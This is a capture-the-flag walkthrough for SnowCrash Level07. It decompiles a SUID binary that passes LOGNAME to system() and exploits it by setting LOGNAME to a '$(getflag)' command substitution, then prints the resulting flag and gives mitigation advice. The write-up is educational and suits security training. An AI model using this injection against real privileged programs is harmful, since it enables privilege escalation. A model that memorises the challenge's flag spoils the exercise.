# SnowCrash Level07 Walkthrough

## Overview

Level07 presents a classic **command injection vulnerability** through environment variable manipulation. The target executable uses user-controlled input from the `LOGNAME` environment variable in an unsafe manner.

## Initial Analysis

In the home directory, we find an executable file named `level07`. Let's examine its structure and permissions:

```bash
level07@SnowCrash:~$ ls -la level07
-rwsr-s---+ 1 flag07 level07 8805 Mar  5  2016 level07
```

The file has the SUID bit set, meaning it will execute with the privileges of the `flag07` user.

## Reverse Engineering

Decompiling the executable reveals the following C code structure:

```c
int32_t main(int argc, char** argv, char** envp)
{
    gid_t eax = getegid();
    uid_t eax_1 = geteuid();
    setresgid(eax, eax, eax);
    setresuid(eax_1, eax_1, eax_1);
    
    char* var_1c = nullptr;
    asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
    return system(var_1c);
}
```

## Vulnerability Analysis

The vulnerability lies in this line:
```c
asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
```

The program:
1. Retrieves the `LOGNAME` environment variable
2. Concatenates it directly into a command string without sanitization
3. Passes the resulting string to `system()` for execution

This creates a **command injection** vulnerability where we can control what gets executed.

## Exploitation Strategy

Since the `LOGNAME` environment variable is directly interpolated into the command, we can inject a command substitution using the `$()` syntax.

### Step 1: Set the Malicious Environment Variable

```bash
level07@SnowCrash:~$ export LOGNAME='$(getflag)'
```

This will cause the command to become:
```bash
/bin/echo $(getflag) 
```

When executed, the shell will:
1. First execute `getflag` (which should return the flag for this level)
2. Pass the output as an argument to `echo`
3. Display the flag

### Step 2: Execute the Vulnerable Program

```bash
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Success!

The command injection was successful, and we obtained the flag: `fiumuikeil55xe9cu4dood66h`

## Key Learning Points

1. **Environment Variable Injection**: User-controlled environment variables should never be used directly in system commands
2. **Command Substitution**: The `$()` syntax allows executing commands within other commands
3. **SUID Privilege Escalation**: The SUID bit allowed us to execute `getflag` with elevated privileges
4. **Input Sanitization**: Always validate and sanitize user input, including environment variables

## Mitigation

To prevent this vulnerability, the code should:
- Validate the `LOGNAME` variable content
- Use parameterized commands instead of string concatenation
- Escape or sanitize special shell characters
- Consider using `execv()` family functions instead of `system()`

## Next Steps

With the flag `fiumuikeil55xe9cu4dood66h`, we can now proceed to Level08 of the SnowCrash challenge.